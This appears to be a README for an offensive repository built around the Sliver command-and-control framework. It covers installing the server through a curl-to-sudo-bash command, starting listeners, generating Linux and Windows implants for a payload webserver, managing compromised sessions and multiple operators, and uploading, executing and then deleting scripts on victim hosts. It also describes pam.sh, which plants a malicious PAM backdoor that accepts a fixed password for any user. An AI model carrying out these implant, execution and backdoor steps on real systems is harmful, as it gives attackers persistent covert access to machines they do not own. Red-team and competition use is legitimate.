# sliver
## Installation
On the attacker server, [install sliver](https://sliver.sh/docs?name=Getting+Started) and make sure the service is started:

```shell
curl https://sliver.sh/install|sudo bash
sudo systemctl status sliver
```

## Implants
Sliver implants can be generated following [these instructions](https://sliver.sh/docs?name=Getting+Started), or in short:

Start sliver (inside the root directory of this repository):
```shell
sliver
```

Start a listener for the implants:
```shell
sliver > mtls
```

Generate the implants:
```shell
sliver > generate --os linux --mtls <SERVER IP> --save payloads/sliver
sliver > generate beacon --os linux --mtls <SERVER IP> --save payloads/sliver_beacon
sliver > generate --os windows --mtls <SERVER IP> --save payloads/sliver.exe
sliver > generate beacon --os windows --mtls <SERVER IP> --save payloads/sliver_beacon.exe
```
This should save the files in the [payloads](./payloads/) directory so they can be served by the  temporary attack webserver.

You'll see a message appear in the sliver console when a new session or beacon is established:
```shell
[*] Session e1839038 SCRAWNY_BOXSPRING - 192.168.122.77:47848 (ubuntu) - linux/amd64 - Fri, 26 Jul 2024 18:28:51 EDT

sliver > sessions

 ID         Transport   Remote Address         Hostname   Username    Operating System   Health  
========== =========== ====================== ========== =========== ================== =========
 e1839038   mtls        192.168.122.77:47848   ubuntu     chewbacca   linux/amd64        [ALIVE] 
```

Connect to sessions or beacons using their ID (can be abbreviated):
```shell
sliver > use e18

[*] Active session SCRAWNY_BOXSPRING (e1839038)

sliver (SCRAWNY_BOXSPRING) > whoami

Logon ID: chewbacca
```

You can also type `use` without any arguments to pull up an interactive selector.

## Multiplayer
Sliver supports a [multiplayer](https://sliver.sh/docs?name=Multi-player+Mode) mode which allows multiple users to remotely authenticate to the sliver server and interact with it. You'll need to generate a config for each user. To do so, start the server management interface:

```shell
sudo /root/sliver-server
```

Then, create the configs:
```shell
[server] sliver > new-operator --name <USERNAME> --lhost <SERVER_IP>
```

This will save the user configuration file in your home directory. SCP or otherwise transfer this file over to the relevant user.

To use this config, on your personal machine, download the latest releases of the [official sliver](https://github.com/BishopFox/sliver/releases) client and the [sliver-automate](https://github.com/infosecwatchman/sliver-automate/releases) client. Once downloaded, run either of the clients (depending on what you want to do) and pass the config file as an argument:
```shell
sliver-automate -config USER_SERVER_IP.cfg
```
See the section below for more info on how to use `sliver-automate`.

## Automate
`sliver-automate` is a custom sliver client designed to make interacting with multiple sessions at a time easier. It offers additional commands that make this process easier than it is with the official client.

To interact with multiple beacons:
```
sliver-automate > interact beacon
sliver-automate > execute <COMMAND>
```

## Scripts
Scripts inside of this directory are meant to be run inside of sliver sessions (not by `attack.py` sessions). These scripts don't work well in automated shells for one reason or another, but they work well in sliver. To run them, while inside of a sliver session or beacon:

```shell
sliver (EMBARRASSED_PANIC) > cd /tmp
sliver (EMBARRASSED_PANIC) > upload sliver/scriptname.sh
sliver (EMBARRASSED_PANIC) > chmod scriptname.sh 777
sliver (EMBARRASSED_PANIC) > execute scriptname.sh
sliver (EMBARRASSED_PANIC) > rm scriptname.sh
```

### pam.sh
This script adds a malicious PAM module that allows any user to authenticate using the password "motobook".
